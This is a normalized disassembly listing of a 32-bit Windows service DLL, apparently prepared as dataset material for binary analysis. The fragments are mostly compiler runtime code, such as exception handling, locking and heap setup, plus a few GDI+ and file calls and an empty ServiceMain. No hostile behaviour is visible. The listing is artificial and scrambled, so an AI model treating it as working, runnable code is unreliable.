cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_1000d892
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_1000d892
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_100119b2
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_10010ad0
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_1000e271
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_10010e49
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_1000d892
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_1000d892
mov edi [ eax + 0x94 ]
call sub_1000d892
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_10010ec7
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_10010ec7
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_10008d7c
test al al
jne r-xdata
call sub_1000e271
cmp eax 0x19930522
jne r-xdata
call sub_1000d892
call sub_1000d892
call sub_1000d892
mov [ eax + 0x88 ] esi
call sub_1000d892
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_10010c7a
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_10010e49
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_10008c8d
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_10009ef4
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_10011338
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1001089d
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_10010d28
add esp 0x10
push [ esi + 0x1c ]
call sub_10010f42
sub_1001183f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1000d892
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_100114ad
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_10010d28
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10011930
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1000f8fc
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1000f8fc
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1001197c
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10011e40
push ebp
mov ebp esp
sub esp 0x10
push 0x8
call sub_10008d9c
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
call sub_10008c8d
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10009ef4
int3
mov [ rw-data ] eax
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
mov [ eax ] rw-data
push sub_10011ed0
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
call sub_10009a0e
add esp 0x4
mov esp ebp
pop ebp
retn
ServiceMain
retn
sub_10001251
lea ecx [ ebp - 0x30 ]
call sub_10008ce9
mov eax sub_1000125f
retn
sub_1000125f
lea ebx [ ebp - 0x68 ]
call sub_100013b0
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10001342
lea ecx [ ebp - 0x1c ]
call sub_10008ce9
mov eax sub_10001350
retn
sub_10001350
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10001370
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_10002970
xor eax eax
pop ebp
retn 0x4
sub_10001390
push esi
mov esi eax
call sub_10001f40
mov eax [ esi ]
push eax
call sub_10008d40
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_10001c8a
lea ecx [ ebp - 0x38 ]
call sub_10008ce9
mov eax sub_10001c98
retn
sub_10001c98
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10001cb0
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push esi
call sub_10008d40
add esp 0x4
mov eax esi
retn
push eax
call sub_10009181
add esp 0x4
sub_10001ef0
mov eax [ ecx + 0x18 ]
retn
sub_10001f00
mov eax [ ecx + 0x18 ]
mov ax [ eax ]
retn
sub_10001f10
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call sub_10008d40
add esp 0x4
sub_100024d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10008d1b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100026b6
lea ecx [ ebp - 0x1c ]
call sub_10008ce9
mov eax sub_100026c4
retn
sub_100026c4
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100026e0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
call sub_10002d20
sub_10002de0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
retn
mov eax [ esi ]
push eax
call sub_10008d40
add esp 0x4
sub_10003380
mov [ eax ] r--data
mov eax [ eax + 0x4 ]
push eax
call [ GdipDisposeImage@IAT ]
retn
sub_100033a0
mov ecx [ eax + 0x10 ]
push ecx
call [ GdiplusShutdown@IAT ]
retn
sub_10003e00
mov eax [ ecx + 0x60 ]
retn
sub_10003e10
mov eax [ ecx + 0x60 ]
mov ax [ eax ]
retn
sub_100041f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_100043d0
xor eax eax
pop ebp
retn 0x4
sub_10005070
lea ecx [ ebp - 0x1c ]
call sub_10008ce9
mov eax sub_1000507e
retn
sub_1000507e
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100053b1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10005440
mov eax [ ecx + 0x8 ]
retn
sub_10005450
mov eax [ ecx + 0x8 ]
mov ax [ eax ]
retn
sub_10005460
push 0xffffffff
call [ Sleep@IAT ]
retn
sub_10005c81
mov edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x30 ]
call sub_10008d1b
push r--data
lea eax [ ebp - 0x30 ]
push eax
call sub_10009ef4
int3
sub_10005ed0
mov eax [ esi ]
test eax eax
je r-xdata
push esi
call sub_10008d40
add esp 0x4
mov eax esi
retn
push eax
call sub_10009181
add esp 0x4
sub_10006030
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_10006800
sub_10006040
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_10006450
sub_100063c0
mov al [ ecx + 0x4 ]
retn
j_sub_10008ce9
jmp sub_10008ce9
sub_10008a90
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10008d1b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10008add
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10008d1b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10008b2a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10008d1b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10008b68
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10008d9c
sub_10008b8d
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_10008bc6
push [ esi ]
call sub_10008d40
pop ecx
pop ecx
pop esi
retn
sub_10008ba4
push [ ecx ]
call sub_10008bd6
pop ecx
retn
sub_10008bad
push [ ecx ]
call sub_10008be6
pop ecx
retn
sub_10008bb6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_10008bc6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_10008bd6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_10008be6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10008c05
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_10008c22
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_10008c6f
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_10009181
pop ecx
sub_10008ce9
mov [ ecx ] r--data
jmp sub_10008c6f
sub_10008d40
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10009181
sub_10008d4b
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_1000a13b
pop ecx
retn
sub_100091fb
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_1000a53b
push 0x1
push 0x0
call sub_1000a4f4
add esp 0xc
jmp sub_1000a4c1
call eax
sub_1000936b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000929a
add esp 0x14
pop ebp
retn
sub_1000956e
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1000bc11
pop ecx
pop ecx
retn
sub_1000959d
push 0x1
call sub_1000cbb9
pop ecx
retn
sub_100095a6
push 0x1
call sub_100094cc
pop ecx
retn
sub_1000972f
push esi
call sub_1000bbd5
pop ecx
retn
sub_10009855
mov edi edi
push ebp
mov ebp esp
call sub_1000d892
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_10009867
call sub_1000d892
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_10009a08
call sub_1000bfce
retn
sub_10009a0e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_100099d2
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_10009a25
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10009c61
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_10009d50
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_1000d728
sub_10009eae
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_1000e1d2
pop ecx
pop ecx
retn
sub_1000a1a2
push 0xe
call sub_1000cbb9
pop ecx
retn
sub_1000a238
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000a372
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_1000a40d
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_1000a42b
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
sub_1000a723
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000ab21
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000bb42
call sub_100095a6
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_10009181
pop ecx
retn
call sub_1000f5f7
sub_1000bc85
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1000bf06
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_1000be30
add esp 0xc
pop ebp
retn 0x4
sub_1000bf39
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_1000f905
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1000bf6b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_1000be30
add esp 0xc
pop ebp
retn 0x8
sub_1000bfad
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1000bf82
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_1000bfc5
push 0x8
call sub_1000cc92
pop ecx
retn
sub_1000bfce
push 0x8
call sub_1000cbb9
pop ecx
retn
sub_1000c1f0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_1000cbb9
pop ecx
sub_1000c205
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1000c0c5
add esp 0xc
pop ebp
retn
sub_1000c21b
push 0x1
push 0x0
push 0x0
call sub_1000c0c5
add esp 0xc
retn
sub_1000c22a
mov edi edi
push ebp
mov ebp esp
call sub_1000a6ea
push [ ebp + 0x8 ]
call sub_1000a53b
pop ecx
push 0xff
call sub_1000c205
int3
sub_1000ca11
push ebx
call sub_1000fb29
pop ecx
retn
sub_1000cb10
push ebx
call sub_1000fb29
pop ecx
retn
sub_1000cbb9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1000cc89
push 0xa
call sub_1000cbb9
pop ecx
retn
sub_1000cf83
push 0xd
call sub_1000cbb9
pop ecx
retn
sub_1000d352
push 0xd
call sub_1000cbb9
pop ecx
retn
sub_1000d38b
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1000d1f1
pop ecx
mov [ rw-data ] 0x1
sub_1000d6d6
push 0xc
call sub_1000cbb9
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1000d6e2
push 0x0
call [ EncodePointer@IAT ]
retn
sub_1000d6eb
call [ TlsAlloc@IAT ]
retn 0x4
sub_1000d807
push 0xd
call sub_1000cbb9
pop ecx
retn
sub_1000d810
push 0xc
call sub_1000cbb9
pop ecx
retn
sub_1000d9c6
push 0xd
call sub_1000cbb9
pop ecx
retn
sub_1000d9d2
push 0xc
call sub_1000cbb9
pop ecx
retn
sub_1000dcdb
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1000dca3
pop ecx
pop ecx
pop ebp
retn
sub_1000dd06
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1000f970
sub_1000dfda
push ebx
call sub_1000fb29
pop ecx
retn
sub_1000e225
push 0x8
push r--data
call sub_1000bc40
call sub_1000d892
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1000a4c1
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1000e245
xor eax eax
inc eax
retn
sub_1000e25e
call sub_1000d892
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_1000e225
call eax
sub_1000e295
xor eax eax
inc eax
retn
sub_1000e2a9
push sub_1000e225
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_1000ea01
and [ rw-data ] 0x0
retn
sub_1000ea09
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1000ea5e
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_1000ebd2
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1000cbb9
pop ecx
sub_1000f068
push [ ebp + 0x8 ]
call sub_1000fb29
pop ecx
retn
sub_1000f3d1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000f2bb
add esp 0x10
pop ebp
retn
sub_1000f5da
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000f485
add esp 0x14
pop ebp
retn
sub_1000f68a
push 0x1
call sub_1000cbb9
pop ecx
retn
sub_1000f7bb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_1000f8d9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1000f810
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1000f924
call eax
retn
sub_1000fb20
push 0xa
call sub_1000cbb9
pop ecx
retn
sub_10010553
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10010500
add esp 0x10
pop ebp
retn
sub_100106df
push 0x2
call sub_1000c22a
sub_100106e8
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_10010707
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_10010790
lea eax [ edx - 0x1 ]
pop ebx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10010c48
mov [ ecx ] r--data
jmp sub_10008ce9
sub_10010da6
push [ ebp - 0x14 ]
call sub_10010cd9
pop ecx
retn
sub_10010dea
call sub_1000d892
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_1000d892
dec [ eax + 0x90 ]
sub_10010e8c
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_10010e95
mov esp [ ebp - 0x18 ]
call sub_1000e225
sub_10010f42
push 0x4
mov eax sub_10011e1f
call sub_1001197c
call sub_1000d892
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1000e25e
call sub_1000e271
sub_1001101b
mov eax [ ebp - 0x14 ]
call sub_10010e04
retn
sub_10011292
xor eax eax
inc eax
retn
sub_10011296
mov esp [ ebp - 0x18 ]
call sub_1000e225
sub_1001132b
xor eax eax
inc eax
retn
sub_1001132f
mov esp [ ebp - 0x18 ]
call sub_1000e225
sub_10011822
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10008d1b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100119b2
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_100119d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_100119f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011a10
mov eax [ ebp + 0x8 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011a1b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011a40
mov eax [ ebp - 0x1c ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011a4b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011a70
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_10004f80
sub_10011a7b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011aa0
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_10004f80
sub_10011aab
mov ecx [ ebp + 0x8 ]
add ecx 0x14
jmp sub_10008b8d
sub_10011ab6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011ae0
mov eax [ ebp - 0x10 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011aeb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011b10
lea eax [ ebp - 0x64 ]
jmp sub_10003380
sub_10011b18
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x94 ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10008bf6
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011b50
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_10001390
sub_10011b5b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011b80
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011ba0
mov eax [ ebp - 0x224 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011bae
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x22c ]
xor ecx eax
call sub_10008bf6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011be0
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_10001390
sub_10011beb
mov eax [ ebp + 0x8 ]
add eax 0x24
jmp sub_10001390
sub_10011bf6
mov eax [ ebp + 0x8 ]
add eax 0x3c
jmp sub_10001390
sub_10011c01
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011c20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011c40
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_100033a0
sub_10011c4b
mov eax [ ebp + 0x8 ]
add eax 0x30
jmp sub_10001390
sub_10011c56
mov eax [ ebp + 0x8 ]
add eax 0x48
jmp sub_10001390
sub_10011c61
mov ecx [ ebp + 0x8 ]
add ecx 0x64
jmp sub_10008b8d
sub_10011c6c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011c90
